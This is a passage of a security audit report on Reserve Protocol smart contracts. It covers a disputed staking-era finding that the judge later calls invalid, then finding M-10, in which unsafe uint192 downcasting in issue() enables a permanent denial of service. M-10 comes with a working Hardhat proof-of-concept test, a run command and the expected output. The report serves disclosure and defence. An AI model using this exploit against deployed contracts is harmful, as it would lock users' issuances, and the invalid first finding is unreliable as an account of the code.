class=\"grvsc-source\">    draftRSR -= draftRSRToTake;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (draftRSR &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                // Downcast is safe: totalDrafts is 1e38 at most so expression maximum value is 1e56</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                draftRate = uint192((FIX_ONE_256 * totalDrafts + (draftRSR - 1)) / draftRSR);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ...</span></span></code></pre>\n<ol start=\"2\">\n<li>stakeRSR portion comes to be 50 which means remaining stakeRSR will be 0 (50-50). This means a new staking era will get started</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (stakeRSR == 0 || stakeRate &gt; MAX_STAKE_RATE) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                seizedRSR += stakeRSR;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                beginEra();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span></code></pre>\n<ol start=\"3\">\n<li>This causes staking era to become 2</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function beginEra() internal virtual {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            stakeRSR = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            totalStakes = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            stakeRate = FIX_ONE;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            era++;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            emit AllBalancesReset(era);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span></code></pre>\n<ol start=\"4\">\n<li>Now draftRSR is still > 0 so only draftRate gets updated. The draft Era still remains 1</li>\n<li>User stakes and unstakes in this new era. Staking is done in era 2</li>\n<li>Unstaking calls the pushDraft which creates User draft on draftEra which is still 1</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function pushDraft(address account, uint256 rsrAmount)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            internal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            returns (uint256 index, uint64 availableAt)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    CumulativeDraft[] storage queue = draftQueues[draftEra][account];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">           ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            queue.push(CumulativeDraft(uint176(oldDrafts + draftAmount), availableAt));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<ol start=\"7\">\n<li>Lets say due to unfortunate condition again seizeRSR need to be called. This time <code>draftRate > MAX_DRAFT_RATE</code> which means draft era increases and becomes 2</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (draftRSR == 0 || draftRate &gt; MAX_DRAFT_RATE) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                seizedRSR += draftRSR;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                beginDraftEra();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span></code></pre>\n<ol start=\"8\">\n<li>This becomes a problem since all unstaking done till now in era 2 were pointing in draft era 1. Once draft era gets updated to 2, all those unstaking are lost.</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Era should be same for staking and draft. So if User is unstaking at era 1 then withdrawal draft should always be era 1 and not some previous era.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/325#issuecomment-1402728967\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I believe the sequence of events here to be off with when beginDraftEra would be called.</p>\n<p>Will leave open for sponsor confirmation on the beginDraftEra call being triggered earlier in the process due to the value of <code>draftRSR == 0</code>. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/325#issuecomment-1405551460\">tbrent (Reserve) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>In the example described, I’m pretty sure point 4 is wrong: draftRSR would be 0 and both the eras would be changed at the same time.</p>\n<p>That said, I don’t think it’s a problem to have different eras for stakeRSR and draftRSR. It’s subtle, but it could be that due to rounding one of these overflows <code>MAX_STAKE_RATE</code>/<code>MAX_DRAFT_RATE</code>, but not the other. This is fine. This means enough devaluation has happened to one of the polities (current stakers; current withdrawers) that they have been wiped out. It’s not a contradiction for the other polity to still be entitled to a small amount of RSR.</p>\n<p>It also might be the warden is misunderstanding the intended design here: if you initiate StRSR unstaking, then a sufficient RSR seizure event <em>should</em> result in the inability to withdraw anything after. </p>\n</blockquote>\n<p><strong><em>Please note: the following comment and re-assessment took place after judging and awarding were finalized. As such, this report will leave this finding in its originally assessed risk category as it simply reflects a snapshot in time.</em></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/325#issuecomment-1428774156\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I wanted to comment and apologize that this issue slipped through the QA process and I didn’t give it a second pass to close it out as invalid. While C4 will not change grades or awards retroactively, it is worth noting for the final report that I do not believe this issue to be valid. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-unsafe-downcasting-in-issue-can-be-exploited-to-cause-permanent-dos\" style=\"position:relative;\"><a href=\"#m-10-unsafe-downcasting-in-issue-can-be-exploited-to-cause-permanent-dos\" aria-label=\"m 10 unsafe downcasting in issue can be exploited to cause permanent dos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/320\">[M-10] Unsafe downcasting in <code>issue(...)</code> can be exploited to cause permanent DoS</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/320\">Soosh</a></em></p>\n<p><strong>Important note!</strong></p>\n<p>I first found this bug in <code>issue(...)</code>, but unsafe downcasting appears in many other areas of the codebase, and seem to also be exploitable but no PoC is provided due to time constraints. Either way, using some form of safe casting library to <strong>replace all occurences</strong> of unsafe downcasting will prevent all the issues. I also do not list the individual instances of unsafe downcasting as all occurences should be replaced with safe cast.</p>\n<h3 id=\"details\" style=\"position:relative;\"><a href=\"#details\" aria-label=\"details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Details</h3>\n<p>The <code>amtRToken</code> is a user supplied parameter in the <code>issue(uint256 amtRToken)</code> function</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amtBaskets</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint192</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk11\">mulDiv256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">basketsNeeded</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">, </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">()) : </span><span class=\"mtk12\">amtRToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The calculated amount is unsafely downcasted into <code>uint192</code>.</p>\n<p>This means that if the resulting calculation is a multiple of $2^{192}$, <code>amtBaskets = 0</code></p>\n<p>The code proceeds to the following line, where <code>erc20s</code> and <code>deposits</code> arrays will be empty since we are asking for a quote for 0. (see <code>quote(...)</code> in <code>BasketHandler.sol</code> where amounts are multiplied by zero)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">erc20s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deposits</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">basketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk11\">quote</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">amtBaskets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">CEIL</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span></code></pre>\n<p>This means an attacker can call <code>issue(...)</code> with a very high <code>amtRToken</code> amount that is a multiple of $2^{192}$, without depositing any amount of collateral.</p>\n<p>The DoS issues arises because <code>whenFinished(uint256 amtRToken)</code> is dependent on <code>amtRToken</code>. With such a high value, <code>allVestAt</code> will be set so far in the future that it causes a permanent DoS. i.e. Issuances will never vest.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vestingEnd</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">whenFinished</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// D18{block number}</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This PoC demonstrates that an attacker can call <code>issue(...)</code> without collateral tokens to modify <code>allVestAt</code> variable to an extreme value, such that all further issuances cannot be vested for all users.</p>\n<p>Do note that the PoC is done with <code>totalSupply() == 0</code> case, so we supply <code>amtRToken</code> as a multiple of $2^{192}$. Even if there is an existing <code>totalSupply()</code>, we just need to calculate a value for <code>amtRToken >= 2^192</code> such that $\\frac{\\text{basketsNeeded} \\times \\text{amtRToken}}{totalSupply()} = 0$. This attack does not require <code>totalSupply()</code> be zero.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amtBaskets</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint192</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk11\">mulDiv256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">basketsNeeded</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">, </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">()) : </span><span class=\"mtk12\">amtRToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The <code>amount</code>, <code>baskets</code> and <code>quantities</code> values are also messed up, but it would not matter anyways…</p>\n<p>Under ‘Issuance and Slow Minting’ tests in <code>RToken.test.ts</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;Audit: DoS by downcasting&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">: </span><span class=\"mtk10\">BigNumber</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">BigNumber</span><span class=\"mtk1\">.</span><span class=\"mtk11\">from</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk4\">n</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">192</span><span class=\"mtk4\">n</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Set basket</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">basketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setPrimeBasket</span><span class=\"mtk1\">([</span><span class=\"mtk12\">token0</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">], [</span><span class=\"mtk11\">fp</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;1&#39;</span><span class=\"mtk1\">)])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">basketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">refreshBasket</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Attacker issues 2 ** 192, or a multiple of 2 ** 192 RTokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// This will cause allVestAt to be veryyyyy high, permanent DoS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tx</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">)[</span><span class=\"mtk8\">&#39;issue(uint256)&#39;</span><span class=\"mtk1\">](</span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receipt</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tx</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wait</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receipt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">events</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">args</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token0</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initialBal</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tx2</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">)[</span><span class=\"mtk8\">&#39;issue(uint256)&#39;</span><span class=\"mtk1\">](</span><span class=\"mtk12\">initialBal</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receipt2</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tx2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wait</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receipt2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">events</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">args</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// one eternity later...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">advanceTime</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;123456789123456789&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// and still not ready</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">vest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;issuance not ready&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    })</span></span></span></code></pre>\n<p>Run with:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"bash\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">yarn test:p1 --grep </span><span class=\"mtk8\">&quot;Audit: DoS&quot;</span></span></span></code></pre>\n<p>Expect to see (only important parts shown):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"bash\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  recipient: </span><span class=\"mtk8\">&#39;0x70997970C51812dc3A010C7d01b50e0d17dc79C8&#39;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  index: BigNumber { value: </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\"> },</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  amount: BigNumber { value: </span><span class=\"mtk8\">&quot;6277101735386680763835789423207666416102355444464034512896&quot;</span><span class=\"mtk1\"> },</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  baskets: BigNumber { value: </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\"> },</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  erc20s: [ </span><span class=\"mtk8\">&#39;0x998abeb3E57409262aE5b751f60747921B33613E&#39;</span><span class=\"mtk1\"> ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  quantities: [ BigNumber { value: </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\"> } ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  blockAvailableAt: BigNumber { value: </span><span class=\"mtk8\">&quot;627710173538668076383578942320766744610235544446403452&quot;</span><span class=\"mtk1\"> }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  recipient: </span><span class=\"mtk8\">&#39;0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC&#39;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  index: BigNumber { value: </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\"> },</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  amount: BigNumber { value: </span><span class=\"mtk8\">&quot;6300000000000000000000000000000000000000000000000000000000&quot;</span><span class=\"mtk1\"> },</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  baskets: BigNumber { value: </span><span class=\"mtk8\">&quot;22898264613319236164210576792333583897644555535965487104&quot;</span><span class=\"mtk1\"> },</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  erc20s: [ </span><span class=\"mtk8\">&#39;0x998abeb3E57409262aE5b751f60747921B33613E&#39;</span><span class=\"mtk1\"> ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  quantities: [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    BigNumber { value: </span><span class=\"mtk8\">&quot;22898264613319236164210576792333583897644555535965487104&quot;</span><span class=\"mtk1\"> }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  blockAvailableAt: BigNumber { value: </span><span class=\"mtk8\">&quot;1257710173538668076383578942320766744610235544446403452&quot;</span><span class=\"mtk1\"> }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  RTokenP1 contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    Issuance and Slow Minting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ✔ Audit: DoS by downcasting</span></span></span></code></pre>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 